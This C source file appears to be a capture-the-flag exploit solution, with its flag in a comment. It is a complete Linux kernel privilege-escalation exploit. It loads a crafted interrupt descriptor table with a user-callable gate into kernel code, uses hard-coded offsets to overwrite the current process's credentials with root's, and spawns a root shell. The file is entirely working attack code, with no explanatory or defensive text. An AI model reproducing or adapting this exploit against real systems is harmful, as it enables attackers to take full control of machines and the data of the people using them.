#include <stdlib.h>

#define GDT_ENTRY_KERNEL_CS 2
#define __KERNEL_CS (GDT_ENTRY_KERNEL_CS * 8)
#define GDT_ENTRY_KERNEL_DS 3
#define __KERNEL_DS (GDT_ENTRY_KERNEL_DS * 8)
#define DEFAULT_STACK 0
#define GATE_INTERRUPT 0xE
/* See __put_task() */
#define offsetof_task_cred 0x5b0
#define offsetof_cred_uid 8

static void kernel_start(void) {
  /* Hopefully the compiler did not generate a prologue. */
  asm volatile("call work\n"
               "iretq\n");
  __builtin_trap();
}

__attribute__((used)) static void work(void) {
  /* Switch to user DS and ES. */
  unsigned long orig_ds;
  asm volatile("mov %%ds, %0" : "=r"(orig_ds));
  asm volatile("mov %0,%%ds\n" ::"r"(__KERNEL_DS));
  unsigned long orig_es;
  asm volatile("mov %%es, %0" : "=r"(orig_es));
  asm volatile("mov %0,%%es\n" ::"r"(__KERNEL_DS));

  /* Switch to kernel GS. */
  asm volatile("swapgs");

  char *current;
  asm("mov %%gs:0x21440,%[current]" : [current] "=r"(current));
  unsigned long cred = *(unsigned long *)(current + offsetof_task_cred);
  /* uid, guid, suid, sgid, euid, egid, fsuid, fsgid */
  __builtin_memset((void *)(cred + offsetof_cred_uid), 0, sizeof(int) * 8);

  /* Switch back to user GS. */
  asm volatile("swapgs");

  /* Switch back to user DS and ES. */
  asm volatile("mov %0,%%ds" ::"r"(orig_ds));
  asm volatile("mov %0,%%es" ::"r"(orig_es));
}

struct idt_bits {
  unsigned short ist : 3, zero : 5, type : 5, dpl : 2, p : 1;
} __attribute__((packed));

struct gate_struct {
  unsigned short offset_low;
  unsigned short segment;
  struct idt_bits bits;
  unsigned short offset_middle;
  unsigned int offset_high;
  unsigned int reserved;
} __attribute__((packed));

static void idt_init_desc(struct gate_struct *gate, unsigned long addr) {
  gate->offset_low = (unsigned short)addr;
  gate->segment = __KERNEL_CS;
  gate->bits.ist = DEFAULT_STACK;
  gate->bits.zero = 0;
  gate->bits.type = GATE_INTERRUPT;
  gate->bits.dpl = 3;
  gate->bits.p = 1;
  gate->offset_middle = (unsigned short)(addr >> 16);
  gate->offset_high = (unsigned int)(addr >> 32);
  gate->reserved = 0;
}

struct desc_ptr {
  unsigned short size;
  void *address;
} __attribute__((packed));

int main(void) {
  struct gate_struct idt[4] = {};
  struct desc_ptr dtr =
                      {
                          .size = sizeof(idt) - 1,
                          .address = &idt,
                      },
                  orig_dtr;
  idt_init_desc(&idt[3], (unsigned long)&kernel_start);

  asm volatile("sidt %[orig_dtr]\n"
               "lidt %[dtr]\n"
               "int $3\n"
               "lidt %[orig_dtr]\n"
               : [orig_dtr] "=m"(orig_dtr)
               : [dtr] "m"(dtr)
               : "cc", "memory");
  system("/bin/sh");  /* BHFlagY{5a919ae1e739a995ff6ebb98d7e01d97} */
  return EXIT_SUCCESS;
}
